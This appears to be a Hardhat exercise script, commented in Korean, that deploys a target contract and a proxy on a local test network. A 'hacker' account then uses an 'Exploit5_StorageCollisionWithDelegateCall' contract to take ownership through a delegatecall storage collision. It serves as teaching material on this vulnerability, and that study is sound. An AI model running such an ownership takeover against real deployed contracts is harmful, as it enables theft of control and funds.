import {ethers} from "hardhat";

async function main() {
    const [owner, victim, hacker] = await ethers.getSigners();

    // proxyContract 배포
    const proxyContract = await ethers.deployContract("ProxyTargetContract");
    const proxyAddress = await proxyContract.getAddress();

    // targetContract 배포
    const targetContract = await ethers.deployContract("TargetContract", [
        owner, 
        proxyAddress,
    ]);
    const targetAddress = await targetContract.getAddress();
    
    console.log("Proxy address: ", proxyAddress);
    console.log("contract's proxy: ", await targetContract.connect(hacker).proxy());

    // exploitContract 배포
    const exploitContract = await ethers.deployContract("Exploit5_StorageCollisionWithDelegateCall");
    const exploitAddress = await exploitContract.getAddress();

    // 프록시 주소 변경
    await targetContract.connect(hacker).changeProxy(exploitAddress);

    console.log("Proxy address: ", proxyAddress);
    console.log("contract's proxy: ", await targetContract.connect(hacker).proxy());

    
    await targetContract.connect(hacker).changeProxy(hacker.address);

    console.log("Owner: ", await targetContract.connect(hacker).owner());
    console.log("Hacker address: ", hacker.address);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});